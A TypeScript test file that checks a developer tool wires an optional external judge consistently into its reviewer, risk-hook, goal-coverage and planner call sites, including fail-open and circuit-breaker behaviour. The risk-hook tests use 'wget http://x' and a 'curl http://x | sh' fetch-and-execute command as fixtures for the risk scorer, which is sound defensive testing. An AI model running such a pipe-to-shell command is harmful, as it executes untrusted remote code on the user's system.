// test/typesafe-callsite-matrix.test.ts
//
// Plan Task 10, Step 1: the SIX joint assertions of the System One integration, each one
// driven through the call site's OWN public entry point. The per-seam unit tests already
// cover each toggle and each fail-open path in isolation (test/dispatch-reviewer-llm.test.ts,
// test/verify-report.test.ts, test/hooks-risk-semantic.test.ts, test/plan-routing.test.ts);
// what only a CROSS-seam file can catch is a seam that is individually fine but collectively
// inconsistent — e.g. one seam that drops `tuning: tuningFor(...)` and silently falls back to
// BREAKER_DEFAULTS (2 failures / 60_000 ms), so a SETTINGS.json retune works at three call
// sites and is ignored at the fourth.
//
// FIXTURE CONTRACT, enforced per seam:
//  - `resetCallBudget()` — `callsThisRun` in src/typesafe-health.ts is PROCESS-global, so
//    without a reset case N inherits case N-1's budget.
//  - a fresh `userRoot` temp dir per case — the breaker is file-backed, so a shared root lets
//    one case's `open` record refuse the next case's call and the assertions become a
//    function of test ORDER.
//  - `delete process.env.VIBEFLOW_AI` around the goalCoverage cases — the bridge is the
//    fail-open destination, and a developer machine with the bridge set would make the
//    fail-open assertion assert the wrong thing.
import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { runLLMReview } from "../src/commands/dispatch-reviewer-llm.js";
import { type RiskJudgeInject, integrateRiskJudge } from "../src/commands/hook-risk-integration.js";
import { routeUnits } from "../src/commands/orchestrate-routing.js";
import { defaultGoalEvalFn } from "../src/commands/tools-detect.js";
import type { WorkUnit } from "../src/core.js";
import type { HookInput } from "../src/core.js";
import { RISK_LEVEL } from "../src/core/hook-contract.js";
import { scoreRisk } from "../src/hooks/risk.js";
import type { EngineReadiness } from "../src/preflight.js";
import { type VibeSettings, readSettings } from "../src/settings.js";
import {
  FAILURE_CLASS,
  TYPESAFE_STATE,
  readHealth,
  resetCallBudget,
} from "../src/typesafe-health.js";
import {
  DEFAULT_TYPESAFE_SETTINGS,
  type TypesafeSettings,
  coerceTypesafeSettings,
} from "../src/typesafe-settings.js";

/** A real key, so nothing in the chain can be excused as "unconfigured". Never a live key. */
const KEY = { TYPESAFE_API_KEY: "sk-gate-fixture" } as NodeJS.ProcessEnv;

/** `wget http://x`: the REACHING risk fixture — deterministic tier LOW *and* a network token,
 *  so `shouldConsultSemantic` admits the judge. `ls`/`rm -rf` would refuse the call and make
 *  every "the judge was not consulted" assertion a constant. */
const REACHING = "wget http://x";

/** A confident, ESCALATING judge answer: it is the only direction allowed to act. */
const FAILING = { covers: { score: 0, confidence: 0.95 }, tests: { noul: 0.1 } };

/** The shared enabled fixture. `timeoutMs` stays at the 3000 default, which is a LEGAL value
 *  at every seam, so the matrix is not accidentally testing the hook's 1500 ms ceiling. */
function enabled(over: Partial<TypesafeSettings> = {}): TypesafeSettings {
  const base = coerceTypesafeSettings({ enabled: true });
  return { ...base, ...over } as TypesafeSettings;
}

function unit(name: string): WorkUnit {
  return {
    name,
    status: "pending",
    confidence: 0,
    gates: { build: "pending", lint: "pending", test: "pending", review: "pending" },
    resources: { agents: 0, tokens: 0, cost_usd: 0, wall_seconds: 0 },
  };
}

const ready = (engine: EngineReadiness["engine"]): EngineReadiness => ({
  engine,
  level: "ready",
  detail: "ready (injected)",
  checkedAt: "",
});

/** Two READY engines: `readyEngines` refuses to route with fewer than two, so a one-engine
 *  ready set would make every planner assertion vacuous. */
const READY_PAIR = [ready("claude"), ready("codex")];

/** A judge that always throws — the "vendor endpoint is wrong" shape. `withTypesafeGuard`
 *  classifies the throw, so this drives the SAME breaker arm a real transport error does. */
const exploding = () => async (): Promise<never> => {
  throw new Error("ECONNREFUSED (injected judge endpoint failure)");
};

let userRoot: string;
let origBridge: string | undefined;

beforeEach(() => {
  resetCallBudget();
  userRoot = mkdtempSync(join(tmpdir(), "vf-ts-matrix-"));
  origBridge = process.env.VIBEFLOW_AI;
});

afterEach(() => {
  if (origBridge === undefined) {
    // biome-ignore lint/performance/noDelete: Bun 1.3 assigns undefined as string "undefined"
    delete process.env.VIBEFLOW_AI;
  } else process.env.VIBEFLOW_AI = origBridge;
  rmSync(userRoot, { recursive: true, force: true });
});

/** Build the risk seam's `VibeSettings` the way `vf hook` does: a REAL SETTINGS.json on disk
 *  read through `readSettings`, so the coerce step is part of what is under test. */
function settingsWithTypesafe(ts: unknown): VibeSettings {
  mkdirSync(join(userRoot, ".vibeflow"), { recursive: true });
  writeFileSync(join(userRoot, ".vibeflow", "SETTINGS.json"), JSON.stringify({ typesafe: ts }));
  return readSettings(userRoot);
}

async function callRisk(
  ts: TypesafeSettings | undefined,
  judgeRisk: RiskJudgeInject["judgeRisk"],
): Promise<ReturnType<typeof scoreRisk> & { consulted: number }> {
  let consulted = 0;
  const base = mkdtempSync(join(tmpdir(), "vf-ts-matrix-risk-"));
  try {
    const semantic = await integrateRiskJudge({
      input: { event: "pre-command", command: REACHING } as HookInput,
      settings: { ...readSettings(base), typesafe: ts },
      base,
      inject: {
        userRoot,
        installLogbus: () => undefined,
        judgeRisk: async (cmd, inject) => {
          consulted++;
          return judgeRisk ? await judgeRisk(cmd, inject ?? {}) : RISK_LEVEL.LOW;
        },
      },
    });
    return {
      ...scoreRisk({ event: "pre-command", command: REACHING }, undefined, semantic),
      consulted,
    };
  } finally {
    rmSync(base, { recursive: true, force: true });
  }
}

async function callGoal(
  ts: TypesafeSettings | undefined,
  judge: () => Promise<never>,
): Promise<{ covered: boolean; uncovered: string[]; consulted: number }> {
  let consulted = 0;
  const result = await defaultGoalEvalFn("ship the gate", {
    gitSpawn: (() => ({ stdout: "" })) as never,
    typesafe: {
      userRoot,
      env: KEY,
      ...(ts === undefined ? {} : { settings: ts }),
      judge: (async () => {
        consulted++;
        return judge();
      }) as never,
    },
  });
  return { ...result, consulted };
}

async function callPlanner(
  ts: TypesafeSettings | undefined,
  judge: () => Promise<string>,
): Promise<{ engines: (string | undefined)[]; consulted: number }> {
  let consulted = 0;
  const out = await routeUnits([unit("a")], READY_PAIR, {
    userRoot,
    ...(ts === undefined ? {} : { settings: ts }),
    judge: (async () => {
      consulted++;
      return judge();
    }) as never,
  });
  return { engines: out.map((u) => u.engine), consulted };
}

describe("matrix (a) — enabled: every one of the four call sites invokes the judge", () => {
  test("reviewer: the configured judge path is reached and may escalate", async () => {
    let consulted = 0;
    const r = await runLLMReview({
      goal: "ship the gate",
      diff: "d",
      llmFn: async () => {
        throw new Error("the engine must not run on the judge's failing verdict");
      },
      typesafe: {
        userRoot,
        env: KEY,
        settings: enabled(),
        judge: async () => {
          consulted++;
          return FAILING;
        },
      },
    });
    expect(consulted).toBe(1);
    expect(r.reviewerEngine).toBe("typesafe");
    expect(r.pass).toBe(false);
  });

  test("risk: the configured judge path is reached and raises the local tier", async () => {
    const r = await callRisk(enabled(), async () => RISK_LEVEL.CRITICAL);
    expect(r.consulted).toBe(1);
    expect(r.risk).toBe(RISK_LEVEL.CRITICAL);
  });

  test("goalCoverage: the configured judge path is reached and may escalate", async () => {
    // biome-ignore lint/performance/noDelete: Bun 1.3 assigns undefined as string "undefined"
    delete process.env.VIBEFLOW_AI;
    let consulted = 0;
    const result = await defaultGoalEvalFn("ship the gate", {
      gitSpawn: (() => ({ stdout: "" })) as never,
      typesafe: {
        userRoot,
        env: KEY,
        settings: enabled(),
        judge: async () => {
          consulted++;
          return FAILING;
        },
      },
    });
    expect(consulted).toBe(1);
    expect(result.covered).toBe(false);
    expect(result.uncovered[0]).toContain("System One judge");
  });

  test("planner: the configured judge path is reached and routes the unit", async () => {
    const r = await callPlanner(enabled(), async () => "codex");
    expect(r.consulted).toBe(1);
    expect(r.engines).toEqual(["codex"]);
  });
});

describe("matrix (b) — disabled: zero judge requests, pre-integration behavior intact", () => {
  const OFF = DEFAULT_TYPESAFE_SETTINGS; // enabled: false

  test("reviewer: no judge request and the engine branch decides", async () => {
    let consulted = 0;
    const r = await runLLMReview({
      goal: "g",
      diff: "d",
      llmFn: async () => "Missing edge case",
      typesafe: {
        userRoot,
        env: KEY,
        settings: OFF,
        judge: async () => {
          consulted++;
          return FAILING;
        },
      },
    });
    expect(consulted).toBe(0);
    expect(r.judge?.source).toBe("engine");
    expect(r.reason).toContain("Missing edge case");
    expect(readHealth({ userRoot }).last_call).toBeUndefined();
  });

  test("risk: no judge request and the deterministic tier stands", async () => {
    const r = await callRisk(OFF, async () => RISK_LEVEL.CRITICAL);
    expect(r.consulted).toBe(0);
    expect(r.risk).not.toBe(RISK_LEVEL.CRITICAL);
    expect(r.reasons.some((x) => /semantic tier/.test(x))).toBe(false);
  });

  test("goalCoverage: no judge request and the no-bridge result is unchanged", async () => {
    // biome-ignore lint/performance/noDelete: Bun 1.3 assigns undefined as string "undefined"
    delete process.env.VIBEFLOW_AI;
    const r = await callGoal(OFF, exploding());
    expect(r.consulted).toBe(0);
    expect(r).toMatchObject({ covered: true, uncovered: [] });
  });

  test("planner: no judge request and no engine is assigned", async () => {
    const r = await callPlanner(OFF, async () => "codex");
    expect(r.consulted).toBe(0);
    expect(r.engines).toEqual([undefined]);
  });

  test("one call site's toggle off suppresses ONLY that site", async () => {
    // The per-site toggle, not the global gate, is what must be load-bearing: with the
    // feature ON and `reviewer: false`, the reviewer is silent while the other three speak.
    const off = enabled({ callSites: { ...DEFAULT_TYPESAFE_SETTINGS.callSites, reviewer: false } });
    let reviewerCalls = 0;
    const r = await runLLMReview({
      goal: "g",
      diff: "d",
      llmFn: async () => "PASS",
      typesafe: {
        userRoot,
        env: KEY,
        settings: off,
        judge: async () => {
          reviewerCalls++;
          return FAILING;
        },
      },
    });
    expect(reviewerCalls).toBe(0);
    expect(r.judge?.source).toBe("engine");
    // Positive control: the SAME fixture with the reviewer toggle on does consult the judge.
    const on = await runLLMReview({
      goal: "g",
      diff: "d",
      llmFn: async () => "PASS",
      typesafe: { userRoot, env: KEY, settings: enabled(), judge: async () => FAILING },
    });
    expect(on.reviewerEngine).toBe("typesafe");
  });
});

describe("matrix (c) — judge endpoint failure: all four fail open", () => {
  test("reviewer: a throwing judge cannot reject out and the engine verdict survives", async () => {
    const r = await runLLMReview({
      goal: "g",
      diff: "d",
      llmFn: async () => "Missing edge case",
      typesafe: { userRoot, env: KEY, settings: enabled(), judge: exploding() },
    });
    expect(r.pass).toBe(false);
    expect(r.reason).toContain("Missing edge case");
    expect(r.judge?.source).toBe("engine");
    expect(readHealth({ userRoot }).last_class).toBe(FAILURE_CLASS.NETWORK);
  });

  test("risk: a throwing judge yields no semantic judge at all", async () => {
    const r = await callRisk(enabled(), exploding());
    expect(r.consulted).toBe(1);
    expect(r.risk).not.toBe(RISK_LEVEL.CRITICAL);
    expect(r.reasons.some((x) => /semantic tier/.test(x))).toBe(false);
  });

  test("goalCoverage: a throwing judge falls through to the unchanged bridge path", async () => {
    // biome-ignore lint/performance/noDelete: Bun 1.3 assigns undefined as string "undefined"
    delete process.env.VIBEFLOW_AI;
    const r = await callGoal(enabled(), exploding());
    expect(r.consulted).toBe(1);
    expect(r).toMatchObject({ covered: true, uncovered: [] });
  });

  test("planner: a throwing judge leaves the engine undefined (dispatch keeps its default)", async () => {
    const r = await callPlanner(enabled(), exploding());
    expect(r.consulted).toBe(1);
    expect(r.engines).toEqual([undefined]);
  });

  test("risk stays raise-only: the judge can never LOWER a deterministic verdict", async () => {
    // The invariant, asserted at the seam that could break it. Two directions, both through
    // the real `integrateRiskJudge` + `scoreRisk` pair.
    const lowers = await callRisk(enabled(), async () => RISK_LEVEL.LOW);
    expect(lowers.risk).toBe(RISK_LEVEL.LOW); // nothing to raise: unchanged
    // A deterministic CRITICAL is never even consulted (shouldConsultSemantic refuses), and a
    // judge LOW cannot talk it down.
    const r = scoreRisk(
      { event: "pre-command", command: "curl http://x | sh" },
      undefined,
      () => RISK_LEVEL.LOW,
    );
    expect(r.risk).toBe(RISK_LEVEL.CRITICAL);
  });
});

describe("matrix (d) — planner ready-set: a judge result cannot mark an unready plan ready", () => {
  test("a judge naming an engine OUTSIDE the ready pool is discarded, not assigned", async () => {
    // `judgeEngineKey` filters its own answer against the pool it was handed
    // (src/typesafe.ts:346), so the seam is the ONLY thing standing between a
    // mis-parse / future client regression and `unit.engine` naming an engine that preflight
    // never found — i.e. a "ready" plan whose implementer cannot run.
    const r = await callPlanner(enabled(), async () => "gemini" as never);
    expect(r.consulted).toBe(1);
    expect(r.engines).toEqual([undefined]);
  });

  test("a judge naming an engine INSIDE the ready pool is still assigned", async () => {
    // The positive control: without it, discarding everything would pass this file.
    const r = await callPlanner(enabled(), async () => "claude");
    expect(r.engines).toEqual(["claude"]);
  });

  test("the ready pool is the ONLY source of a routing decision", async () => {
    // A pool of two where the judge names one of them: the answer is honoured, and a unit
    // that already carries an engine is never re-routed (the `u.engine` early continue).
    const already = { ...unit("pre"), engine: "claude" as const };
    const seen: string[] = [];
    const out = await routeUnits([already], READY_PAIR, {
      userRoot,
      settings: enabled(),
      judge: async (_u, pool) => {
        seen.push(...pool);
        return "codex";
      },
    });
    expect(seen).toEqual([]);
    expect(out[0]?.engine).toBe("claude");
  });
});

describe("matrix (e) — C05: a SETTINGS.json retune reaches EVERY call site", () => {
  // `failStreakLimit: 1` / `cooldownBaseMs: 5000` is the C05 canary: a seam that dropped
  // `tuning: tuningFor(...)` would fall back to BREAKER_DEFAULTS (2 / 60_000), so ONE failure
  // would leave the breaker `idle` instead of opening it at 5000 ms. The settings are written
  // as a REAL SETTINGS.json and read back through `readSettings`, so the coerce step is under
  // test too — a clamp that silently rewrote 5000 to 60_000 would show up here.
  const RETUNED = { enabled: true, failStreakLimit: 1, cooldownBaseMs: 5000 };

  const openedAfterOneFailure = () => {
    const h = readHealth({ userRoot });
    expect(h.state).toBe(TYPESAFE_STATE.OPEN);
    expect(h.fail_streak).toBe(1);
    expect(h.cooldown_ms).toBe(5000);
    return h;
  };

  test("reviewer", async () => {
    const ts = settingsWithTypesafe(RETUNED).typesafe;
    expect(ts?.failStreakLimit).toBe(1);
    expect(ts?.cooldownBaseMs).toBe(5000);
    await runLLMReview({
      goal: "g",
      diff: "d",
      llmFn: async () => "Missing edge case",
      typesafe: { userRoot, env: KEY, settings: ts, judge: exploding() },
    });
    openedAfterOneFailure();
  });

  test("risk", async () => {
    const ts = settingsWithTypesafe(RETUNED).typesafe;
    await callRisk(ts, exploding());
    openedAfterOneFailure();
  });

  test("goalCoverage", async () => {
    // biome-ignore lint/performance/noDelete: Bun 1.3 assigns undefined as string "undefined"
    delete process.env.VIBEFLOW_AI;
    const ts = settingsWithTypesafe(RETUNED).typesafe;
    await callGoal(ts, exploding());
    openedAfterOneFailure();
  });

  test("planner", async () => {
    const ts = settingsWithTypesafe(RETUNED).typesafe;
    await callPlanner(ts, exploding());
    openedAfterOneFailure();
  });

  test("an OPEN breaker refuses the NEXT call at the same site (the retune took effect)", async () => {
    // The refusal arm of the ladder, and the reason every case here needs its OWN userRoot
    // (`beforeEach` mints one): with the retune honoured, the second call inside the 5000 ms
    // cooldown is refused WITHOUT ever reaching the judge.
    const ts = settingsWithTypesafe(RETUNED).typesafe;
    let consulted = 0;
    const judge = async () => {
      consulted++;
      throw new Error("ECONNREFUSED");
    };
    await routeUnits([unit("a")], READY_PAIR, { userRoot, settings: ts, judge: judge as never });
    expect(consulted).toBe(1);
    await routeUnits([unit("b")], READY_PAIR, { userRoot, settings: ts, judge: judge as never });
    expect(consulted).toBe(1); // refused by the open breaker, not re-called
  });
});

describe("matrix (f) — every guard call site hands the guard its outcome probe", () => {
  test("no call site can silently record a vendor failure as a success", async () => {
    const { readdirSync, readFileSync, statSync } = await import("node:fs");
    const { join } = await import("node:path");
    const walk = (dir: string): string[] =>
      readdirSync(dir).flatMap((entry) => {
        const full = join(dir, entry);
        if (statSync(full).isDirectory()) return walk(full);
        return full.endsWith(".ts") ? [full] : [];
      });
    // The guard reads `inject.outcome?.()` and falls back to `FAILURE_CLASS.NONE`. A call site
    // that omits it records EVERY vendor failure as a success, so the failStreakLimit ladder never
    // advances and the file-backed breaker never trips — the seam looks healthy while the key is
    // revoked. Three of the five call sites shipped that way (risk, goalCoverage and the probe),
    // which is why this is asserted mechanically rather than per seam: the per-seam tests all
    // passed, because each one injected a judge double and never inspected the health record.
    //
    // The slice runs from each `withTypesafeGuard(` to its matching close paren, with string
    // literals blanked first so a paren inside a message cannot unbalance the count.
    const blankStrings = (text: string): string =>
      text.replace(/"(?:[^"\\\n]|\\.)*"/g, '""').replace(/'(?:[^'\\\n]|\\.)*'/g, "''");
    const violations: string[] = [];
    let checked = 0;
    for (const file of walk("src")) {
      const text = blankStrings(readFileSync(file, "utf8"));
      let from = 0;
      for (;;) {
        const at = text.indexOf("withTypesafeGuard(", from);
        if (at === -1) break;
        from = at + 1;
        const open = at + "withTypesafeGuard(".length;
        let depth = 1;
        let i = open;
        while (i < text.length && depth > 0) {
          const ch = text[i];
          if (ch === "(") depth += 1;
          else if (ch === ")") depth -= 1;
          i += 1;
        }
        const slice = text.slice(open, i);
        checked += 1;
        if (!slice.includes("outcome:"))
          violations.push(`${file}:${text.slice(0, at).split("\n").length}`);
      }
    }
    expect(checked).toBeGreaterThanOrEqual(4);
    expect(violations).toEqual([]);
  });
});

describe("matrix (e) — the goal-coverage seam hands the judge config to the goal eval", () => {
  test("`?goal-eval=1` forwards the repo's block, and no goal means no seam at all", async () => {
    const { goalEvalOptions } = await import("../src/server/routes-verify.js");
    const { DEFAULT_TYPESAFE_SETTINGS } = await import("../src/typesafe-settings.js");
    // The seam exists because `defaultGoalEvalFn` reads the judge config out of its SECOND
    // argument. `POST /api/verify?goal-eval=1` used to build the goal eval without it, so the
    // callee always saw `inject.typesafe === undefined` and `callSites.goalCoverage` was dead in
    // production while its per-seam test stayed green.
    const retuned = {
      ...DEFAULT_TYPESAFE_SETTINGS,
      enabled: true,
      callSites: { ...DEFAULT_TYPESAFE_SETTINGS.callSites, goalCoverage: true },
    };
    const options = goalEvalOptions("ship the thing", retuned);
    expect(options?.goal).toBe("ship the thing");
    expect(options?.goalEvalInject.typesafe.settings).toBe(retuned);
    // An absent block still receives the defaults, which are disabled.
    expect(goalEvalOptions("ship the thing", undefined)?.goalEvalInject.typesafe.settings).toBe(
      DEFAULT_TYPESAFE_SETTINGS,
    );
    // No recorded goal: no goal eval at all, so the chain sees pre-Task-4 behavior.
    expect(goalEvalOptions(undefined, retuned)).toBeNull();
    expect(goalEvalOptions("", retuned)).toBeNull();
  });
});
